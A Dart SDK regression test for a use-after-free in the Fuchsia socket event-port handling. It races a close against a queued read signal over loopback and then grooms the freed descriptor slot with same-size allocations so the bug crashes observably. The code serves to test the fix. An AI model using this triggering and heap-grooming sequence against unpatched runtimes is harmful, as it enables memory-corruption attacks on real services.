// Copyright (c) 2026, the Dart project authors.  Please see the AUTHORS file
// for details. All rights reserved. Use of this source code is governed by a
// BSD-style license that can be found in the LICENSE file.

// Regression test for b/524683625, use-after-free via zx_port packet key.

import 'dart:async';
import 'dart:io';
import 'dart:typed_data';

const int kIterations = 1000;
const int kBurstCount = 64; // > 16 to drain TokenCounter<16>.

Future<void> main() async {
  if (Platform.isWindows) return; // Especially slow on Windows.

  final server = await RawServerSocket.bind(InternetAddress.loopbackIPv4, 0);
  final port = server.port;
  print('[+] server listening on 127.0.0.1:$port');

  var hitsOnData = 0;

  server.listen((RawSocket s) {
    var reads = 0;
    s.listen(
      (RawSocketEvent ev) {
        if (ev == RawSocketEvent.read) {
          // IOHandle::Read -> AsyncWaitLocked(POLLIN, wait_key_ = di) on the
          // Dart thread, INDEPENDENT of di->Mask().
          final data = s.read();
          reads++;
          hitsOnData++;
          // After enough events that the EH-side TokenCounter is plausibly
          // drained (Mask()==0 -> UpdatePort no-op on close), close from
          // inside onData. The read() above just registered observer W with
          // key=di; close() enqueues kCloseCommand behind which W's
          // SIGNAL_ONE(key=di) will land when the client's trailing bytes
          // arrive.
          if (reads >= 20 || (data != null && data.contains(0xFF))) {
            s.close();
          }
        } else if (ev == RawSocketEvent.readClosed) {
          s.close();
        }
      },
      onError: (_, __) {
        try {
          s.close();
        } catch (_) {}
      },
    );
  });

  final payload = Uint8List(64)..fillRange(0, 64, 0x41);
  final closeMe = Uint8List(4)..fillRange(0, 4, 0xFF);
  final trailer = Uint8List(64)..fillRange(0, 64, 0x42);

  for (var i = 0; i < kIterations; i++) {
    RawSocket? c;
    final grooms = <RawSocket>[];
    try {
      c = await RawSocket.connect(InternetAddress.loopbackIPv4, port);
      c.writeEventsEnabled = false;

      // Phase 1: drain the server-side TokenCounter by generating many
      // distinct read events. Tiny writes with micro-yields so each lands as
      // its own POLLIN edge on the server.
      for (var j = 0; j < kBurstCount; j++) {
        c.write(payload);
        await Future<void>.delayed(Duration.zero);
      }

      // Phase 2: tell the server's onData to read()+close().
      c.write(closeMe);
      // Let the server's onData run: it does read() (registers W keyed on
      // di) then close() (enqueues kCloseCommand).
      await Future<void>.delayed(const Duration(milliseconds: 1));

      // Phase 3: trailing segment after kCloseCommand is queued. This
      // asserts ZX_SOCKET_READABLE on the still-open zircon handle (fdio_
      // holds a ref until ~IOHandle), firing W and queuing
      // SIGNAL_ONE(key=di) behind kCloseCommand. With repro.patch the
      // 200ms sleep in kCloseCommand makes this ordering deterministic.
      c.write(trailer);
      c.write(trailer);

      // Phase 4: groom the freed DescriptorInfoSingle slot with fresh
      // same-size allocations so a non-ASAN build also crashes / corrupts
      // observably.
      for (var g = 0; g < 4; g++) {
        try {
          grooms.add(
            await RawSocket.connect(InternetAddress.loopbackIPv4, port),
          );
        } catch (_) {}
      }

      await Future<void>.delayed(const Duration(milliseconds: 5));
    } catch (_) {
      // keep hammering
    } finally {
      try {
        c?.close();
      } catch (_) {}
      for (final g in grooms) {
        try {
          g.close();
        } catch (_) {}
      }
    }
    if ((i & 0x3f) == 0) {
      print('[.] iter=$i serverReads=$hitsOnData');
    }
  }

  await server.close();
}
